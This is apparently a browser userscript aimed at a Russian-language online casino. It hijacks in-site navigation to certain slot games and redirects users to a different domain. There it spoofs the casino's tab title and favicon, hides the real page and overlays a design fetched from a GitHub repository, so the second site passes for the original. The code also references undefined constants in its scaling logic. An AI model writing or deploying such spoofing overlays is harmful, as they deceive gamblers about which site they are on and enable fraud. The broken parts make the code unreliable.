(function () {
    'use strict';

    const GITHUB_BASE = "https://raw.githubusercontent.com/fpytn32-del/fsdfdsfd/main/";
    const ORIGIN_DOMAIN = "https://drgn21ney.casino";
    const TARGET_TITLE = "DragonMoney | Играть на деньги";
    const TARGET_ICON = "https://drgn21ney.casino/favicon.ico";

    const GAME_ALIASES = {
        "the dog house": "pragmatic/vs20doghouse",
        "sugar rush 1000": "pragmatic/vs20sugarrushx",
        "sweet bonanza": "pragmatic/vs20fruitsw",
        "gates of olympus": "pragmatic/vs20olympgate"
    };

    // =========================================================================
    // 🌀 ЛОГИКА ДЛЯ ОРИГИНАЛЬНОГО САЙТА (drgn21ney.casino) - ЛОВУШКА
    // =========================================================================
    if (window.location.hostname.includes("drgn21ney")) {
        let lastCheckedUrl = window.location.href;
        let isRedirecting = false;

        function checkAndRedirect(url) {
            if (isRedirecting) return;
            if (!url.includes('/game/') && !url.includes('/play')) return;

            try {
                const decodedUrl = decodeURIComponent(url).toLowerCase();
                let streamPath = null;
                let githubId = null;

                for (let origName in GAME_ALIASES) {
                    if (decodedUrl.includes(origName.toLowerCase())) {
                        streamPath = "/play-game/" + GAME_ALIASES[origName];
                        githubId = GAME_ALIASES[origName].split('/').pop(); 
                        break;
                    }
                }

                if (streamPath && githubId) {
                    isRedirecting = true;
                    
                    const blocker = document.createElement("div");
                    blocker.style.cssText = "position:fixed; top:0; left:0; width:100vw; height:100vh; background:#161924; z-index:9999999; display:flex; justify-content:center; align-items:center;";
                    blocker.innerHTML = `
                        <div style="position:absolute;left:50%;top:50%;transform:translate(-50%,-50%);z-index:100">
                            <style>@keyframes dm-spin{to{transform:rotate(1turn)}}</style>
                            <svg style="width:72px;height:72px;fill:#f2a100;animation:dm-spin 1s linear infinite" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                                <path fill-rule="evenodd" clip-rule="evenodd" d="M12 20C16.4183 20 20 16.4183 20 12H22C22 17.5228 17.5228 22 12 22V20ZM4 12C4 7.58172 7.58172 4 12 4V2C6.47715 2 2 6.47715 2 12H4Z"></path>
                            </svg>
                        </div>
                    `;
                    document.documentElement.appendChild(blocker);

                    // ИСПОЛЬЗУЕМ НАСТОЯЩИЙ FETCH ДЛЯ СЕРВЕРА
                    fetch(GITHUB_BASE + githubId + ".html", { method: "HEAD" })
                        .then(res => {
                            if (res.ok) {
                                window.location.href = `https://stream.win${streamPath}`;
                            } else {
                                blocker.remove();
                                isRedirecting = false;
                            }
                        })
                        .catch(() => {
                            blocker.remove();
                            isRedirecting = false;
                        });
                }
            } catch(e) {
                isRedirecting = false;
            }
        }

        const originalPushState = history.pushState;
        history.pushState = function() {
            originalPushState.apply(this, arguments);
            checkAndRedirect(window.location.href);
        };

        const originalReplaceState = history.replaceState;
        history.replaceState = function() {
            originalReplaceState.apply(this, arguments);
            checkAndRedirect(window.location.href);
        };

        window.addEventListener('popstate', () => checkAndRedirect(window.location.href));

        setInterval(() => {
            if (window.location.href !== lastCheckedUrl) {
                lastCheckedUrl = window.location.href;
                checkAndRedirect(window.location.href);
            }
        }, 100);

        checkAndRedirect(window.location.href);

        return; 
    }

    // =========================================================================
    // 🎮 ЛОГИКА ДЛЯ ТВОЕГО САЙТА (stream.win)
    // =========================================================================

    const BASE_SCREEN_WIDTH = 1920; 
    const SLOT_WIDTH  = 1340;
    const SLOT_HEIGHT = 754;
    const SLOT_TOP    = 220;
    const SLOT_LEFT   = 328;

    let lastGameId = null;
    let designHtml = null;
    let slotInserted = false;
    let isCinemaMode = false;
    let initStarted = false;
    let preloaderRemoved = false;

    function enforceFakeTab() {
        const applyFakeTab = () => {
            if (document.title !== TARGET_TITLE) {
                document.title = TARGET_TITLE;
            }
            let foundCorrectIcon = false;
            document.querySelectorAll("link[rel~='icon'], link[rel='shortcut icon'], link[rel='apple-touch-icon']").forEach(link => {
                if (link.href !== TARGET_ICON) {
                    link.remove(); 
                } else {
                    foundCorrectIcon = true;
                }
            });
            if (!foundCorrectIcon && document.head) {
                const link = document.createElement('link');
                link.rel = 'icon';
                link.href = TARGET_ICON;
                document.head.appendChild(link);
            }
        };

        applyFakeTab();

        const headObserver = new MutationObserver(() => applyFakeTab());
        const checkHead = setInterval(() => {
            if (document.head) {
                clearInterval(checkHead);
                headObserver.observe(document.head, { childList: true, subtree: true, characterData: true });
                setInterval(applyFakeTab, 500);
            }
        }, 10);
    }

    function showPreloader() {
        if (document.getElementById("dm-preloader")) return;

        const preloader = document.createElement("div");
        preloader.id = "dm-preloader";
        preloader.style.cssText = `
            position: fixed;
            top: 0; left: 0;
            width: 100vw; height: 100vh;
            background: #161924; 
            z-index: 9999999;
            transition: opacity 0.4s ease, visibility 0.4s ease;
        `;

        preloader.innerHTML = `
            <div id="LOADER_FOR_FCP" style="position:absolute;left:50%;top:50%;transform:translate(-50%,-50%);z-index:100">
                <style>@-webkit-keyframes spin{to{transform:rotate(1turn)}}@keyframes spin{to{transform:rotate(1turn)}}</style>
                <svg style="width:72px;height:72px;fill:#f2a100;animation:spin 1s linear infinite" class="animate-spin text-[72px] text-yellow" width="72" height="72" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                    <path fill-rule="evenodd" clip-rule="evenodd" d="M12 20C16.4183 20 20 16.4183 20 12H22C22 17.5228 17.5228 22 12 22V20ZM4 12C4 7.58172 7.58172 4 12 4V2C6.47715 2 2 6.47715 2 12H4Z"></path>
                </svg>
            </div>
        `;
        
        const tryInsertLoader = setInterval(() => {
            if (document.body || document.documentElement) {
                (document.body || document.documentElement).appendChild(preloader);
                clearInterval(tryInsertLoader);
            }
        }, 10);

        setTimeout(hidePreloader, 4000);
    }

    function hidePreloader() {
        if (preloaderRemoved) return;
        preloaderRemoved = true;
        
        const preloader = document.getElementById("dm-preloader");
        if (preloader) {
            preloader.style.opacity = "0"; 
            preloader.style.visibility = "hidden"; 
            setTimeout(() => preloader.remove(), 500); 
        }
    }

    function getGameId() {
        const match = location.href.match(/\/play-game\/[^/]+\/([^/?#]+)/);
        return match ? match[1] : null;
    }

    function hideOriginalSite() {
        const lockStyle = document.createElement("style");
        lockStyle.innerHTML = `
            html, body {
                margin: 0 !important;
                padding: 0 !important;
                overflow: hidden !important;
                background: #161924 !important;
                width: 100vw !important;
                height: 100vh !important;
                max-width: 100vw !important;
                max-height: 100vh !important;
            }
            body > *:not(#dm-wrapper):not(#dm-preloader) {
                display: none !important;
            }
            
            :fullscreen, :fullscreen *, :fullscreen body, :fullscreen html {
                scrollbar-width: none !important;
                -ms-overflow-style: none !important;
                overflow: hidden !important; 
            }
            :fullscreen::-webkit-scrollbar, :fullscreen *::-webkit-scrollbar {
                display: none !important;
                width: 0px !important;
                height: 0px !important;
                background: transparent !important;
            }
            html.dm-is-fullscreen, body.dm-is-fullscreen {
                overflow: hidden !important;
            }
        `;
        
        const tryInsertStyle = setInterval(() => {
            if (document.head) {
                document.head.appendChild(lockStyle);
                clearInterval(tryInsertStyle);
            }
        }, 10);
    }

    function syncVh() {
        const dFrame = document.getElementById("dm-design-frame");
        if (dFrame && dFrame.contentWindow) {
            try {
                const doc = dFrame.contentDocument;
                const vh = window.innerHeight * 0.01;
                doc.documentElement.style.setProperty('--vh', `${vh}px`, 'important');
                doc.body.style.setProperty('--vh', `${vh}px`, 'important');

                const appDiv = doc.getElementById('app');
                const appFlex = doc.querySelector('#app > div');
                if (appDiv) appDiv.style.setProperty('height', '100vh', 'important');
                if (appFlex) appFlex.style.setProperty('height', '100vh', 'important');
            } catch (e) {}
        }
    }

    function applyDesign(html) {
        hideOriginalSite();
        document.getElementById("dm-wrapper")?.remove();

        const wrapper = document.createElement("div");
        wrapper.id = "dm-wrapper";
        wrapper.style.cssText = "position:fixed !important; top:0 !important; left:0 !important; width:100vw !important; height:100vh !important; z-index:9999 !important; background:#161924 !important; overflow:hidden !important;";

        const designFrame = document.createElement("iframe");
        designFrame.id = "dm-design-frame";
        designFrame.style.cssText = "position:absolute !important; top:0 !important; left:0 !important; width:100% !important; height:100% !important; border:none !important; z-index:1 !important;";
        
        const slotContainer = document.createElement("div");
        slotContainer.id = "dm-slot-container";
        slotContainer.style.cssText = `
            position: fixed !important; 
            top: ${SLOT_TOP}px !important; 
            left: ${SLOT_LEFT}px !important; 
            width: ${SLOT_WIDTH}px !important; 
            height: ${SLOT_HEIGHT}px !important; 
            z-index: 99999 !important; 
            background: transparent !important;
            transform: translateY(0px) !important;
            transition: none !important;
            will-change: transform, top, left, width, height;
            overflow: hidden !important; 
        `;

        wrapper.appendChild(designFrame);
        wrapper.appendChild(slotContainer);
        document.body.appendChild(wrapper);

        const parser = new DOMParser();
        const doc = parser.parseFromString(html, "text/html");
        
        doc.querySelectorAll("script").forEach(s => s.remove());
        doc.querySelectorAll("iframe").forEach(i => i.remove());

        const styleFix = doc.createElement("style");
        styleFix.innerHTML = `
            body { background: #161924 !important; }
            .is-arrow, [class*="is-arrow"] { display: none !important; }
            [class*="balance"], [class*="amount"] { display: flex !important; align-items: center !important; }
            [class*="balance"] img, [class*="amount"] img { margin: auto 4px auto 0 !important; }
            main, #page-content-container { background: transparent !important; }
            a, button, [role="button"], .nav-control { cursor: pointer !important; }
            
            html.dm-hide-scrollbar, body.dm-hide-scrollbar, .dm-hide-scrollbar {
                overflow: hidden !important;
                scrollbar-width: none !important;
            }
            html.dm-hide-scrollbar *::-webkit-scrollbar,
            body.dm-hide-scrollbar *::-webkit-scrollbar,
            .dm-hide-scrollbar::-webkit-scrollbar { 
                display: none !important; 
                width: 0 !important; 
                height: 0 !important; 
            }
        `;
        doc.head.appendChild(styleFix);

        const redirectScript = doc.createElement("script");
        redirectScript.textContent = `
            const TARGET_DOMAIN = "${ORIGIN_DOMAIN}";
            const SIDEBAR_LINKS = [
                "/", "/play-game/crash", "/play-game/double", "/play-game/nvuti-game", 
                "/play-game/jackpot-game", "/play-game/tickets-game", "/play-game/plinko-game", 
                "/wallet/deposit", "/bonuses", "/support"
            ];

            function toggleCinema() {
                window.parent.postMessage({ type: "TOGGLE_CINEMA" }, "*");
            }

            document.addEventListener('click', function(e) {
                const target = e.target.closest('a, button, [role="button"], .nav-control');
                if (target) {
                    e.preventDefault(); e.stopPropagation();
                    
                    const html = target.outerHTML.toLowerCase();
                    const text = target.textContent.toLowerCase();

                    // Фуллскрин
                    const svgUse = target.querySelector('use');
                    const hasFullscreenIcon = svgUse && svgUse.getAttribute('xlink:href') && svgUse.getAttribute('xlink:href').includes('fullscreen');
                    
                    if (hasFullscreenIcon) {
                        toggleCinema();
                        return;
                    }

                    // Кнопка "Вернуться"
                    if (text.includes('вернуться') || text.includes('назад') || html.includes('вернуться')) {
                        window.top.location.href = TARGET_DOMAIN + "/games/providers/list/categories";
                        return;
                    }
                    
                    // Остальные ссылки
                    let url = TARGET_DOMAIN;
                    const sidebar = document.querySelector('aside');
                    if (sidebar && sidebar.contains(target)) {
                        const allBtns = Array.from(sidebar.querySelectorAll('a, button, .nav-control'));
                        const index = allBtns.indexOf(target);
                        url += SIDEBAR_LINKS[index] || "/";
                    } else {
                        const href = target.getAttribute('href');
                        if (href && !href.startsWith('javascript')) {
                            if (href.startsWith('http')) { window.top.location.href = href; return; }
                            url += href;
                        }
                    }
                    window.top.location.href = url;
                }
            }, true);
        `;
        doc.body.appendChild(redirectScript);

        designFrame.contentWindow.document.open();
        designFrame.contentWindow.document.write(doc.documentElement.outerHTML);
        designFrame.contentWindow.document.close();
    }

    function findGameIframe() {
        const iframes = document.querySelectorAll('iframe');
        for (let i = 0; i < iframes.length; i++) {
            const src = iframes[i].src || "";
            if (!src || src === "about:blank") continue;
            if (src.includes("google") || src.includes("yandex") || src.includes("analytics") || src.includes("chat")) continue;
            return iframes[i];
        }
        return null;
    }

    function insertSlot() {
        if (slotInserted) return;

        const iframe = findGameIframe();
        if (!iframe) {
            setTimeout(insertSlot, 200); 
            return;
        }

        slotInserted = true;
        applyDesign(designHtml);

        const slotContainer = document.getElementById("dm-slot-container");
        if (slotContainer) {
            slotContainer.appendChild(iframe);
            iframe.style.cssText = "position:absolute !important; top:0 !important; left:0 !important; width:100.5% !important; height:100% !important; border:none !important; margin:0 !important; padding:0 !important; overflow:hidden !important;";
            
            const shield = document.createElement("div");
            shield.style.cssText = "position:absolute; top:0; left:0; width:100%; height:100%; z-index:10000; background:transparent;";
            slotContainer.appendChild(shield);

            const updateScroll = () => {
                if (isCinemaMode) return;
                try {
                    const dFrame = document.getElementById("dm-design-frame");
                    const scroller = dFrame.contentDocument.querySelector('#page-content-container'); 
                    const scrollY = scroller ? scroller.scrollTop : 0;
                    slotContainer.style.setProperty("transform", `translateY(-${scrollY}px)`, "important");
                } catch(e) {}
            };

            shield.addEventListener('wheel', function(e) {
                if (isCinemaMode) return;
                e.preventDefault();
                const dFrame = document.getElementById("dm-design-frame");
                if (dFrame && dFrame.contentWindow) {
                    try {
                        const scroller = dFrame.contentDocument.querySelector('#page-content-container');
                        if (scroller) {
                            scroller.scrollTop += e.deltaY;
                            updateScroll(); 
                        }
                    } catch(err) {}
                }
            });

            shield.addEventListener('click', function() {
                shield.style.display = 'none'; 
            });

            slotContainer.addEventListener('mouseleave', function() {
                if (!isCinemaMode) {
                    shield.style.display = 'block';
                }
            });

            const dFrame = document.getElementById("dm-design-frame");
            dFrame.onload = function() {
                const scroller = dFrame.contentDocument.querySelector('#page-content-container');
                if (scroller) {
                    scroller.addEventListener('scroll', updateScroll, { passive: true });
                }
                setTimeout(hidePreloader, 300);
            };
            
            function updateScale() {
                if (isCinemaMode) return; 
                
                const winWidth = window.innerWidth;
                const scale = winWidth / BASE_SCREEN_WIDTH; 
                
                const currentWidth = BASE_SLOT_WIDTH * scale;
                const currentHeight = BASE_SLOT_HEIGHT * scale;
                const currentTop = BASE_SLOT_TOP * scale;
                const currentLeft = BASE_SLOT_LEFT * scale;
                
                slotContainer.style.setProperty("width", currentWidth + "px", "important");
                slotContainer.style.setProperty("height", currentHeight + "px", "important");
                slotContainer.style.setProperty("top", currentTop + "px", "important");
                slotContainer.style.setProperty("left", currentLeft + "px", "important");
            }

            updateScale();
            window.addEventListener('resize', updateScale);
        }

        window.addEventListener("message", function(event) {
            if (event.data && event.data.type === "TOGGLE_CINEMA") {
                if (!document.fullscreenElement) {
                    document.documentElement.requestFullscreen().catch(e => console.log(e));
                } else {
                    document.exitFullscreen().catch(e => console.log(e));
                }
            }
        });

        document.addEventListener("fullscreenchange", function() {
            const slot = document.getElementById("dm-slot-container");
            const design = document.getElementById("dm-design-frame");
            const shield = slot.querySelector("div[style*='z-index:10000']"); 
            
            if (!slot || !design) return;

            if (document.fullscreenElement) {
                isCinemaMode = true;
                
                document.documentElement.classList.add("dm-is-fullscreen");
                
                try { 
                    design.contentDocument.documentElement.classList.add("dm-hide-scrollbar"); 
                    design.contentDocument.body.classList.add("dm-hide-scrollbar"); 
                    design.contentDocument.querySelector('#page-content-container')?.classList.add("dm-hide-scrollbar"); 
                } catch(e){}

                slot.style.setProperty("top", "0px", "important");
                slot.style.setProperty("left", "0px", "important");
                slot.style.setProperty("width", "100vw", "important");
                slot.style.setProperty("height", "100vh", "important");
                slot.style.setProperty("transform", "none", "important"); 
                design.style.filter = "brightness(0.3)";
                
                if (shield) shield.style.display = "none"; 

            } else {
                isCinemaMode = false;
                
                document.documentElement.classList.remove("dm-is-fullscreen");
                
                try { 
                    design.contentDocument.documentElement.classList.remove("dm-hide-scrollbar"); 
                    design.contentDocument.body.classList.remove("dm-hide-scrollbar"); 
                    design.contentDocument.querySelector('#page-content-container')?.classList.remove("dm-hide-scrollbar"); 
                } catch(e){}

                design.style.filter = "none";

                const winWidth = window.innerWidth;
                const scale = winWidth / BASE_SCREEN_WIDTH;
                slot.style.setProperty("top", (BASE_SLOT_TOP * scale) + "px", "important");
                slot.style.setProperty("left", (BASE_SLOT_LEFT * scale) + "px", "important");
                slot.style.setProperty("width", (BASE_SLOT_WIDTH * scale) + "px", "important");
                slot.style.setProperty("height", (BASE_SLOT_HEIGHT * scale) + "px", "important");

                try {
                    const scroller = design.contentDocument.querySelector('#page-content-container'); 
                    const scrollY = scroller ? scroller.scrollTop : 0;
                    slot.style.setProperty("transform", `translateY(-${scrollY}px)`, "important");
                } catch(e){}

                if (shield) shield.style.display = "block"; 
            }
        });
    }

    function loadDesign(gameId) {
        // Заменили GM_xmlhttpRequest на нативный fetch
        fetch(GITHUB_BASE + gameId + ".html")
            .then(res => {
                if (!res.ok) throw new Error("File not found");
                return res.text();
            })
            .then(html => {
                designHtml = html;
                slotInserted = false;
                insertSlot();
            })
            .catch(() => {
                hidePreloader();
            });
    }

    function init() {
        if (initStarted) return;
        
        const gameId = getGameId();
        if (!gameId) return;

        initStarted = true;
        enforceFakeTab(); 
        showPreloader(); 

        if (gameId === lastGameId) return;
        lastGameId = gameId;
        designHtml = null;
        slotInserted = false;
        loadDesign(gameId);
    }

    init();
    document.addEventListener("DOMContentLoaded", init);
    new MutationObserver(init).observe(document.documentElement, { childList: true, subtree: true });

})();
